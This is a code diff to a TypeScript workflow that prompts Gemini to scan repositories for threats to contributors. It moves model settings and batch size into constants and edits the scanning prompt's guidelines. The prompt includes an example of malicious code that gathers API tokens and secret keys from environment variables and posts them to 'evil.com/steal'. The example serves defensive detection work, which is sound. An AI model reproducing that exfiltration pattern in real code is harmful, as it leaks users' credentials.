@@ -4,16 +4,17 @@
  */
 
 import { GeminiService, SchemaType } from "./gemini-service";
-import { GitHubClient } from "../github/client";
+import { GitHubClient } from "../../github/client";
 import * as fs from "fs";
 import * as path from "path";
-
-/**
- * Sleep utility for rate limiting
- */
-function sleep(ms: number): Promise<void> {
-  return new Promise((resolve) => setTimeout(resolve, ms));
-}
+import {
+  SCAN_BATCH_SIZE,
+  GEMINI_RISK_DETECTION_TEMPERATURE,
+  GEMINI_RISK_DETECTION_THINKING_BUDGET,
+  GEMINI_MAX_OUTPUT_TOKENS,
+  GEMINI_SAFETY_LEVEL_TEMPERATURE,
+  GEMINI_SAFETY_LEVEL_MAX_TOKENS,
+} from "@/lib/constants";
 
 export interface GeminiWorkflowConfig {
   geminiApiKey: string;
@@ -293,15 +294,14 @@ export class GeminiScanWorkflow {
 
     const scannedFilesList = Object.keys(repoData.scannedFiles);
 
-    // Divide files into batches (5 files per batch)
-    const BATCH_SIZE = 5;
+    // Divide files into batches
     const batches: string[][] = [];
-    for (let i = 0; i < scannedFilesList.length; i += BATCH_SIZE) {
-      batches.push(scannedFilesList.slice(i, i + BATCH_SIZE));
+    for (let i = 0; i < scannedFilesList.length; i += SCAN_BATCH_SIZE) {
+      batches.push(scannedFilesList.slice(i, i + SCAN_BATCH_SIZE));
     }
 
     log(
-      `   📦 Processing ${batches.length} batches (${BATCH_SIZE} files per batch)`
+      `   📦 Processing ${batches.length} batches (${SCAN_BATCH_SIZE} files per batch)`
     );
     log(
       `   🔄 Analyzing complete file contents for thorough security review\n`
@@ -343,11 +343,6 @@ export class GeminiScanWorkflow {
 
 ${batchFilesDetails}
 
-Context:
-- Total files in repo: ${repoData.treeSize}
-- This is batch ${batchNum} of ${batches.length}
-- Production deps: ${repoData.dependencies.production.length}
-- Dev deps: ${repoData.dependencies.dev.length}
 
 YOUR JOB: Identify threats to OPEN SOURCE CONTRIBUTORS who clone, install dependencies, or contribute to this repository.
 
@@ -372,12 +367,22 @@ SEVERITY RULES - ONLY report "moderate" or "severe":
 - DO NOT report "low" severity findings - skip them entirely to save tokens
 
 IMPORTANT GUIDELINES:
-- Be concise: Keep "issue" explanations to one sentence maximum
-- codeSnippet: Extract THE EXACT LINE where the issue occurs. If it spans multiple lines, show max 2 lines with original formatting, then "..." to indicate more code follows.
-- Context matters: CI/CD and dev tooling are normal, not threats
-- If no moderate/severe issues found in a category, return empty array
+1. Be concise: Keep "issue" explanations to one sentence maximum
+2. codeSnippet: Extract THE EXACT LINE where the issue occurs. If it spans multiple lines, show max 2 lines with original formatting, then "..." to indicate more code follows.
+For example, if the malicious code is:
+"
+  const credentials = {
+    token: process.env.API_TOKEN,
+    secret: process.env.SECRET_KEY
+  };
+  https.post('evil.com/steal', credentials);
+",
+Then the codeSnippet should be:
+"const credentials = {\\n  token: process.env.API_TOKEN,\\n..."
+3. Context matters: CI/CD and dev tooling are normal, not threats
+4. If no moderate/severe issues found in a category, return empty array
 
-EXAMPLE of a good codeSnippet:
+EXAMPLE of a codeSnippet:
 If the malicious code is:
   const credentials = {
     token: process.env.API_TOKEN,
@@ -420,9 +425,9 @@ Return JSON in this exact format:
 
       try {
         const result = await this.geminiService.callGeminiJSON(prompt, {
-          temperature: 0.2,
-          thinkingBudget: 8000, // Limit thinking tokens to ~8K, leaving ~57K for JSON output
-          maxTokens: 65536, // Maximum limit to prevent JSON truncation on complex batches
+          temperature: GEMINI_RISK_DETECTION_TEMPERATURE,
+          thinkingBudget: GEMINI_RISK_DETECTION_THINKING_BUDGET,
+          maxTokens: GEMINI_MAX_OUTPUT_TOKENS,
           responseSchema: {
             type: SchemaType.OBJECT,
             properties: {
@@ -696,8 +701,8 @@ Return JSON in this exact format:
       safetyLevel: string;
       aiSummary: string;
     }>(prompt, {
-      temperature: 0.1,
-      maxTokens: 32768, // High limit for thinking and response
+      temperature: GEMINI_SAFETY_LEVEL_TEMPERATURE,
+      maxTokens: GEMINI_SAFETY_LEVEL_MAX_TOKENS,
       responseSchema: {
         type: SchemaType.OBJECT,
         properties: {
